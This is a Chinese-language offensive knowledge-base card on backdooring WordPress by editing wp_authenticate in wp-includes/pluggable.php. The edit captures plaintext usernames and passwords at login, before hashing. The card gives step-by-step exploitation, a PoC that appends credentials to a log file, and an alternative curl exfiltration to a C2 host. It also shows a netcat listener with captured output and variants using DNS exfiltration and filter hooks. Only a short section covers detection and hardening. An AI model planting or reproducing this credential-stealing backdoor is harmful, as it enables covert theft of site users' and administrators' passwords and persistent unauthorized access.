---
id: web-php-wordpress-wp-authenticate-plaintext-credential-backdoor
title: WordPress wp_authenticate 后门：修改 pluggable.php 把登录明文账号密码落盘或外带 C2
type: scenario
domain: web
path: web/php
technique: wordpress-wp-authenticate-plaintext-backdoor
tags:
- wordpress
- php
- backdoor
- credential
- plaintext
- persistence
- post-exploitation
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V575
  verified_at: '2026-11-12T11:01:31+08:00'
  notes: 已对照原文与图08/09核对：原文在 wp_authenticate 开头插入 system('curl .../?password='.$username.$password) 后 nc -lvnp 18080 收到 GET /?password=may123456；改为 file_put_contents('accesss.log',...) 后 /var/log/accesss.log 记录 may123456。卡片插件路径采用正确的 wp-includes/pluggable.php（原文笔误 wp-include），落盘/外带两种变体与截图一致。dedup 最近候选 web-php-wordpress-admin-weak-password-theme-editor-rce（获取入口）与 web-php-wordpress-backup-sql-phpass-credential（拖库破解哈希）sink 不同，非同链；其余候选 new。原文未标组件影响版本，未设 affected_versions；PoC 未在本机复跑。
url: /docs/web/php/web-php-wordpress-wp-authenticate-plaintext-credential-backdoor/
draft: false
kb_aliases:
- WordPress 明文密码劫持
- wp_authenticate 后门
- pluggable.php 改登录
- WordPress 登录凭据窃取
- accesss.log 明文密码
---

## 一句话结论

WordPress 的登录校验入口 `wp_authenticate($username, $password)` 在哈希比对前就拿到明文口令；攻击者一旦能改核心文件，只需在 `wp-includes/pluggable.php` 的该函数开头插入 `file_put_contents('accesss.log', $username.$password)`（或 `curl`/DNS 外带），之后每次用户登录都会把明文账号密码写入 Web 目录或发送到 C2，比拖库破解 phpass 哈希更直接。

## 原理

- `wp_authenticate()` 定义在 `wp-includes/pluggable.php`，是 WordPress 可插拔函数：主题/插件可在加载前重定义它。登录请求 `wp-login.php` 会把用户提交的 `log`/`pwd` 原样传入该函数，函数内部再调用 `wp_check_password()` 做 phpass/bcrypt 哈希比对。
- 因此修改该函数即可在**哈希之前**截获明文口令；不需要破解数据库里的 `$P$` 哈希，也不依赖弱口令字典。
- 落盘方式最隐蔽且不依赖外部网络：`file_put_contents('accesss.log', $username.$password, FILE_APPEND)` 把凭据追加到 Web 根或 `/var/log/` 下，攻击者隔一段时间回来读取；若目标出网，可用 `curl http://c2/?password=$username$password` 或 `dns_get_record()` 等把域名/参数外带，规避 HTTP 日志特征。
- 相比 `system()` 反弹，纯 PHP 文件写入/HTTP 请求不容易被禁用函数策略拦截（`system/exec` 常被 disable_functions 禁用），且不会产生明显子进程；代价是需要在 Web 目录留下日志文件，需注意权限与可访问性。
- 该手法属于「已获得文件写权限后的后门持久化」：常与主题编辑器、插件上传、任意文件写等入口结合，用于长期收集管理员/编辑的明文口令。

## 触发条件

- 攻击者已能修改 WordPress 核心文件（主题编辑器、插件上传、任意文件写、服务器权限）。
- `wp-includes/pluggable.php` 未被文件完整性保护/WAF 阻止修改，且 Web 进程对其有写权限。
- 目标允许写日志文件到可访问目录（或能出网到 C2）。
- 有用户持续登录（管理员/编辑），或攻击者能诱导登录。

## 利用步骤

1. 获取并备份 `wp-includes/pluggable.php`，定位 `function wp_authenticate($username, $password)`。
2. 在函数开头插入凭据收集代码（落盘或外带），保持原有逻辑不变以免登录异常暴露。
3. 根据需要创建日志文件并赋予 Web 用户写权限（如 `touch accesss.log && chmod o+w accesss.log`），或在外带场景准备 C2 监听。
4. 等待管理员/用户登录；在 `accesss.log` 或 C2 中读取 `用户名+明文口令`。
5. 用窃取到的管理员口令登录 `wp-admin`，按主题编辑器/插件上传等路径 getshell；结束后恢复 `pluggable.php` 原文件并清理日志。

## PoC

```php
// wp-includes/pluggable.php 内 wp_authenticate() 开头插入
function wp_authenticate($username, $password) {
    $username = sanitize_user($username);
    $password = trim($password);
    // 落盘方式：追加明文账号密码
    file_put_contents('accesss.log', $username . $password . "\n", FILE_APPEND);
    // 或外带方式：curl http://<c2>/?password=$username$password
    ...
}
```

```bash
# 攻击者侧观察
nc -lvnp 18080
# GET /?password=may123456 HTTP/1.1
# 或
cat /var/log/accesss.log
# may123456
```

说明：原文在 WordPress 环境中修改后，`nc` 收到 `may123456`，`accesss.log` 中也出现同一明文凭据；本库未复跑。

## 变体与关联

- 变体：外带改为 `dns_get_record()`、图片请求、第三方 API 等低特征通道；落盘改为写入上传目录/缓存目录。
- 变体：Hook `wp_authenticate` 过滤器/自定义插件而非改核心文件，减少文件哈希变化。
- 关联：[[web-php-wordpress-admin-weak-password-theme-editor-rce]]（拿到管理员口令后的后台 getshell）、[[web-php-web-php-wordpress-backup-sql-phpass-credential]]（从备份数据库提取 phpass 哈希，本卡是其前置明文截获替代）。
- 边界：核心文件完整性监控（如 Wordfence）会告警；`pluggable.php` 只读或容器只读文件系统时无法修改；无用户再登录时收集不到新凭据。

## 检测与防御

- 检测：`wp-includes/pluggable.php` 哈希变化；Web 目录出现 `accesss.log` 等异常日志文件；登录请求对应进程发起外部 HTTP/DNS 请求。
- 防御：设置 `DISALLOW_FILE_EDIT`、核心文件只读与完整性监控；限制 Web 目录写权限；部署 WAF 监控文件修改与异常外联。
- 加固：管理员启用 2FA/强口令；定期比对 WordPress 核心文件哈希；最小权限运行 Web 进程。
